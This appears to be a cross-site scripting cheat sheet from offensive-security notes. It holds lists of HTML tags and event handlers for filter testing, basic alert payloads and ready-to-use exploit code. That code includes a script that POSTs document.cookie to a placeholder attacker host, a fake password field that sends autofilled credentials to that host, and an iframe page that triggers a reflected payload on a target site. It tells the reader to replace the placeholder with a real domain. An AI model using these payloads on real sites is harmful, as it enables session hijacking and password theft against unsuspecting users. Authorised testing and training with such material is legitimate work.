# Cross-Site Scripting

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}

<details>

<summary>All tags</summary>

```
a
a2
abbr
acronym
address
animate
animatemotion
animatetransform
applet
area
article
aside
audio
audio2
b
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
custom tags
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
iframe2
image
image2
image3
img
img2
input
input2
input3
input4
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
set
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
video2
wbr
xmp
```

</details>

<details>

<summary>All events</summary>

```
onafterprint
onafterscriptexecute
onanimationcancel
onanimationend
onanimationiteration
onanimationstart
onauxclick
onbeforecopy
onbeforecut
onbeforeinput
onbeforeprint
onbeforescriptexecute
onbeforetoggle
onbeforeunload
onbegin
onblur
onbounce
oncanplay
oncanplaythrough
onchange
onclick
onclose
oncontextmenu
oncopy
oncuechange
oncut
ondblclick
ondrag
ondragend
ondragenter
ondragexit
ondragleave
ondragover
ondragstart
ondrop
ondurationchange
onend
onended
onerror
onfinish
onfocus
onfocusin
onfocusout
onformdata
onfullscreenchange
onhashchange
oninput
oninvalid
onkeydown
onkeypress
onkeyup
onload
onloadeddata
onloadedmetadata
onloadstart
onmessage
onmousedown
onmouseenter
onmouseleave
onmousemove
onmouseout
onmouseover
onmouseup
onmousewheel
onmozfullscreenchange
onpagehide
onpageshow
onpaste
onpause
onplay
onplaying
onpointerdown
onpointerenter
onpointerleave
onpointermove
onpointerout
onpointerover
onpointerrawupdate
onpointerup
onpopstate
onprogress
onratechange
onrepeat
onreset
onresize
onscroll
onscrollend
onsearch
onseeked
onseeking
onselect
onselectionchange
onselectstart
onshow
onstart
onsubmit
onsuspend
ontimeupdate
ontoggle
ontoggle(popover)
ontouchend
ontouchmove
ontouchstart
ontransitioncancel
ontransitionend
ontransitionrun
ontransitionstart
onunhandledrejection
onunload
onvolumechange
onwebkitanimationend
onwebkitanimationiteration
onwebkitanimationstart
onwebkittransitionend
onwheel
```

</details>

## HTML Context

```
<script>alert(document.cookie)</script>
```

```
<img src=x onerror=alert(document.cookie)>
```

## XSS Exploit

### Steal Cookie

Replace `evil-website.com` in the code with the actual domain

```
<script>
fetch("https://evil-website.com", {
  method: "POST",
  mode: "no-cors",
  body: JSON.stringify({ cookie: document.cookie }),
});
</script>
```

### Steal Password

* Only for users who have enabled autofill passwords
* Replace `evil-website.com` in the code with the actual domain

```
<input name="username" id="username" />
<input
    name="password"
    id="password"
    type="password"
    onchange="if(this.value.length); fetch('https://evil-website.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});"
/>
```

## Experiment

### `onresize` event (GET)

* You need to start an HTTP service for the victim to access
* Replace `vulnerable-website.com` in the code with the actual domain
* Replace `<xss-parameter>` in the code with the actual parameter.
* Replace `<%3Cbody%20onresize=%22print()%22%3E>` in the code with the actual payload.
  * The decoded value is x `<body onresize="print()">`

```
<br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />

<iframe
    src="https://vulnerable-website.com/?<xss-parameter>=<%3Cbody%20onresize=%22print()%22%3E>"
    onload="this.style.width='0'; this.style.height='0'"
></iframe>
```
